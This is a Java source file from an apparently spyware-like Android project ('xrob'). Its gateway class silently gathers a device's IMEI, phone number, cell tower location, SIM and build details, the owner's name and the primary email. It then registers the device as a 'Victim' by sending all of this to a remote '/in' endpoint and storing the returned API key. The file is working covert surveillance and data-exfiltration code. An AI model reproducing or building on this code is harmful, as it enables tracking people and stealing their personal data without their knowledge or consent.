package com.theah64.xrob.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.WorkerThread;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * All the auth needed API request must be passed through this gate way.
 * Created by theapache64 on 12/9/16.
 */
public class APIRequestGateway {

    private static final String KEY_API_KEY = "api_key";

    private static final String X = APIRequestGateway.class.getSimpleName();
    private final Activity activity;
    private TelephonyManager tm;

    private static String getDeviceName() {
        final String manufacturer = Build.MANUFACTURER;
        final String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model.toUpperCase();
        } else {
            return manufacturer.toUpperCase() + " " + model;
        }
    }


    public static class DeviceInfoBuilder {

        private static final String HOT_REGEX = "[,=]";
        public StringBuilder stringBuilder = new StringBuilder();

        public DeviceInfoBuilder put(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value)).append(",");
            return this;
        }

        public DeviceInfoBuilder put(final String key, final int value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final long value) {
            return put(key, String.valueOf(value));
        }

        public DeviceInfoBuilder put(final String key, final boolean value) {
            return put(key, String.valueOf(value));
        }

        private static String getCooledValue(String value) {
            return value.replaceAll(HOT_REGEX, "~");
        }

        public DeviceInfoBuilder putLastInfo(final String key, final String value) {
            stringBuilder.append(getCooledValue(key)).append("=").append(getCooledValue(value));
            return this;
        }

        @Override
        public String toString() {
            return stringBuilder.toString();
        }


    }

    private String getOtherDeviceInfo() {


        final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();

        if (CommonUtils.isSupport(17)) {
            int i = 0;
            for (final CellInfo cellInfo : tm.getAllCellInfo()) {
                i++;

                deviceInfoBuilder.put(i + " CellInfo timeStamp", cellInfo.getTimeStamp());
                deviceInfoBuilder.put(i + " CellInfo isRegistered", cellInfo.isRegistered());

                if (cellInfo instanceof CellInfoCdma) {
                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoCdma) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoCdma) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoGsm) {
                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoWcdma) {
                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
                } else if (cellInfo instanceof CellInfoLte) {
                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
                } else {
                    deviceInfoBuilder.put(i + "CellInfo class", cellInfo.getClass().getName());
                    deviceInfoBuilder.put(i + "CellInfo toString", cellInfo.toString());
                }
            }
        }


        //Collecting cell location
        final GsmCellLocation gcmCellLoc = (GsmCellLocation) tm.getCellLocation();
        deviceInfoBuilder.put("CID", gcmCellLoc.getCid())
                .put("LAC", gcmCellLoc.getLac())
                .put("PSC", gcmCellLoc.getPsc());

        //Collecting sim card details
        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
                .put("Line1Number", tm.getLine1Number())
                .put("CellLocation", tm.getCellLocation().toString())
                .put("SoftwareVersion", tm.getDeviceSoftwareVersion());

        if (CommonUtils.isSupport(24)) {
            deviceInfoBuilder.put("Line1Number", getDateNetworkType(tm.getDataNetworkType()));
        }

        if (CommonUtils.isSupport(19)) {
            deviceInfoBuilder.put("MMSUAProfileUrl", tm.getMmsUAProfUrl());
        }

        //Collecting device details
        deviceInfoBuilder
                .put("Build.BOARD", Build.BOARD)
                .put("Build.BOOTLOADER", Build.BOOTLOADER)
                .put("Build.BRAND", Build.BRAND)
                .put("Build.DEVICE", Build.DEVICE)
                .put("Build.FINGERPRINT", Build.FINGERPRINT)
                .put("Build.DISPLAY", Build.DISPLAY)
                .put("Build.HARDWARE", Build.HARDWARE)
                .put("Build.HOST", Build.HOST)
                .put("Build.ID", Build.ID)
                .put("Build.PRODUCT", Build.PRODUCT)
                .put("Build.SERIAL", Build.SERIAL);


        if (CommonUtils.isSupport(14)) {
            deviceInfoBuilder.putLastInfo("Build.getRadioVersion()", Build.getRadioVersion());
        } else {
            //noinspection deprecation
            deviceInfoBuilder.putLastInfo("Build.RADIO", Build.RADIO);
        }

        return deviceInfoBuilder.toString();
    }

    private static String getDateNetworkType(int dataNetworkType) {
        switch (dataNetworkType) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "TYPE_GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "TYPE_EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "TYPE_UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "TYPE_HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "TYPE_HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "TYPE_CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "TYPE_EVDO_0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "TYPE_EVDO_A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                return "TYPE_EVDO_B";
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "TYPE_1xRTT";
            case TelephonyManager.NETWORK_TYPE_IDEN:
                return "TYPE_IDEN";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "TYPE_LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return "TYPE_EHRPD";
            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
                return "TYPE_UNKNOWN";
            default:
                return "TYPE_VERY_UNKNOWN";
        }
    }

    public interface APIRequestGatewayCallback {
        void onReadyToRequest(final String apiKey);

        void onFailed(final String reason);
    }

    private final Context context;
    @NonNull
    private final APIRequestGatewayCallback callback;

    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
        this.context = context;
        this.activity = activity;
        this.callback = callback;
        execute();
    }

    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
        this(activity.getBaseContext(), activity, callback);
    }

    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
        this(context, null, callback);
    }


    private void register(final Context context) {

        final ProfileUtils profileUtils = ProfileUtils.getInstance(context);

        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        //Collecting needed information
        final String name = profileUtils.getDeviceOwnerName();

        final String imei = tm.getDeviceId();
        final String deviceName = getDeviceName();
        final String deviceHash = DarKnight.getEncrypted(deviceName + imei);
        final String otherDeviceInfo = getOtherDeviceInfo();

        final String email = profileUtils.getPrimaryEmail();
        final String phone = profileUtils.getPhone();
        final PrefUtils prefUtils = PrefUtils.getInstance(context);
        final String fcmId = prefUtils.getString(Victim.KEY_FCM_ID);


        //Attaching them with the request
        final Request inRequest = new APIRequestBuilder("/in")
                .addParamIfNotNull(Victim.KEY_NAME, name)
                .addParam(Victim.KEY_IMEI, imei)
                .addParam(Victim.KEY_DEVICE_NAME, deviceName)
                .addParam(Victim.KEY_DEVICE_HASH, deviceHash)
                .addParam(Victim.KEY_OTHER_DEVICE_INFO, otherDeviceInfo)
                .addParamIfNotNull(Victim.KEY_FCM_ID, fcmId)
                .addParamIfNotNull(Victim.KEY_EMAIL, email)
                .addParamIfNotNull(Victim.KEY_PHONE, phone)
                .build();

        //Doing API request
        OkHttpUtils.getInstance().getClient().newCall(inRequest).enqueue(new Callback() {

            @Override
            public void onFailure(Call call, final IOException e) {
                e.printStackTrace();
                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onFailed(e.getMessage());
                        }
                    });
                } else {
                    callback.onFailed(e.getMessage());
                }
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {

                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);

                    //Saving in preference
                    final SharedPreferences.Editor editor = prefUtils.getEditor();
                    if (fcmId != null) {
                        editor.putBoolean(PrefUtils.IS_FCM_SYNCED, true);
                    }

                    editor.putString(KEY_API_KEY, apiKey).commit();
                    editor.putBoolean(PrefUtils.IS_LOGGED_IN, true);

                    if (activity != null) {

                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onReadyToRequest(apiKey);
                            }
                        });

                    } else {
                        callback.onReadyToRequest(apiKey);
                    }
                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();
                    if (activity != null) {
                        activity.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                callback.onFailed(e.getMessage());
                            }
                        });
                    } else {
                        callback.onFailed(e.getMessage());
                    }
                }
            }
        });

    }

    private void execute() {

        Log.d(X, "Opening gateway...");

        if (NetworkUtils.hasNetwork(context)) {

            Log.i(X, "Has network");

            final PrefUtils prefUtils = PrefUtils.getInstance(context);
            final String apiKey = prefUtils.getString(KEY_API_KEY);

            if (apiKey != null) {

                Log.d(X, "hasApiKey " + apiKey);

                if (activity != null) {
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            callback.onReadyToRequest(apiKey);
                        }
                    });
                } else {
                    callback.onReadyToRequest(apiKey);
                }

            } else {

                Log.i(X, "Registering victim...");

                //Register victim here
                register(context);
            }

        } else {

            if (activity != null) {
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        callback.onFailed("No network!");
                    }
                });
            } else {
                callback.onFailed("No network!");
            }

            Log.e(X, "Doesn't have APIKEY and no network!");

        }
    }
}
